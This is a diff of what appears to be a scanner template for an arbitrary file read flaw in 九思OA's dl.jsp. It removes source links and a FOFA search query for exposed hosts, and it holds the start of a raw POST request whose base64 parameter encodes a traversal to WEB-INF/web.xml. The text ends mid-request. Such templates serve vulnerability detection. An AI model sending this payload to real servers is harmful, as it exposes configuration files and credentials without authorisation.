@@ -3,12 +3,8 @@ info:
   name: 九思OA dl.jsp 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ic5ks0khdx6d15w5'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ic5ks0khdx6d15w5
-    fofa: body="/jsoa/login.jsp"
 http:
 - raw:
   - 'POST /jsoa/dl.jsp?JkZpbGVOYW1lPS4uLy4uLy4uL1dFQi1JTkYvd2ViLnhtbCZwYXRoPS9h HTTP/1.1
